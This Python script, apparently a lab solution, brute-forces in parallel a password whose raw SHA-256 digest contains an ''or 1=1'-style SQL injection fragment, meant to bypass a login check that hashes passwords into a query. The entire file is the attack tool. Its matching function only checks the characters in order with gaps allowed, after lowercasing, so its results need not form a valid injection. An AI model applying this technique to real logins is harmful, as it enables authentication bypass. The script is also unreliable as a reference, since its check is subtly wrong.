import random
import string
from hashlib import sha256
from multiprocessing import Process

def contains_in_order(password_digest, parts):
    index = -1  # Start before the beginning of the string
    for part in parts:
        # Find the next part in the string starting from the last index
        index = password_digest.lower().find(part, index + 1)
        if index == -1:
            return False  # If any part is not found, return False
    return True  # All parts found in order

def generate_hash(i: int):
    while True:
        # Generate a random string
        random_string0 = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(random.randint(20,1000)))
        random_string = 'bungle-' + random_string0
        password_bytes = random_string.encode("latin-1")
        password_digest = sha256(password_bytes).digest().decode("latin-1")

        sqlInject = ["'", "o", "r", "1", "=", "1"];
        
        #sha256_str = sha256(random_string.encode("latin-1")).digest().decode("latin-1", errors="ignore")
        if contains_in_order(password_digest, sqlInject):
            print("Random String", random_string0)
            break

if __name__ == "__main__":
    # Create and start multiple processes for parallel hash generation
    process_handle = []

    for i in range(20):
        t = Process(target=generate_hash, args=(i,))
        process_handle.append(t)
        t.start()

    # Join all processes to ensure they complete execution
    for t in process_handle:
        t.join() 
    
